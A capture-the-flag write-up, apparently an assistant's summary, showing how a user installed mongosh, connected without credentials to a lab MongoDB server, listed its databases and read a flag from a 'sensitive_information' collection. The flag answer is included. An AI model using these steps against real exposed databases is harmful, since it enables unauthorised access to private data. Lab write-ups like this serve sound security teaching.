# MongoDB

MangoDB

Here’s a summarized breakdown of the **zsh commands** and steps you executed:

***

#### **1. Download the Correct Mongosh Version**

You downloaded the **ARM64 version** of `mongosh` (MongoDB Shell) since your system likely has an ARM-based architecture.

Command:

```bash
curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-arm64.tgz
```

***

#### **2. Extract the File**

You extracted the contents of the downloaded `.tgz` archive.

Command:

```bash
tar xvf mongosh-2.3.2-linux-arm64.tgz
```

***

#### **3. Navigate to the Executable**

You navigated into the directory where the `mongosh` binary is located.

Commands:

```bash
cd mongosh-2.3.2-linux-arm64/bin
```

***

#### **4. Connect to the MongoDB Server**

You executed the `mongosh` binary and connected to the remote MongoDB server running at `10.129.214.72` on the default MongoDB port (`27017`).

Command:

```bash
./mongosh mongodb://10.129.214.72:27017
```

***

#### **5. Explore MongoDB**

Within the MongoDB shell, you performed the following operations:

1.  **List All Databases**:

    ```bash
    show dbs
    ```

    Output:

    * `admin`
    * `config`
    * `local`
    * `sensitive_information`
    * `users`
2.  **Switch to the `sensitive_information` Database**:

    ```bash
    use sensitive_information
    ```

    Output:

    * Switched context to `sensitive_information`.
3.  **List All Collections in the Database**:

    ```bash
    show collections
    ```

    Output:

    * `flag`
4.  **Retrieve the Data in the `flag` Collection**:

    ```bash
    db.flag.find().pretty()
    ```

    Output:

    *   The flag object:

        ```json
        {
          "_id": ObjectId("630e3dbcb82540ebbd1748c5"),
          "flag": "1b6e6fb359e7c40241b6d431427ba6ea"
        }
        ```

***

#### **Summary**

You successfully:

1. Installed and ran the MongoDB shell (`mongosh`) on an ARM-based Kali system.
2. Connected to a remote MongoDB server.
3. Enumerated databases and collections.
4. Retrieved a sensitive flag (`1b6e6fb359e7c40241b6d431427ba6ea`) stored in the `flag` collection of the `sensitive_information` database.

Let me know if you need further assistance! 🚀



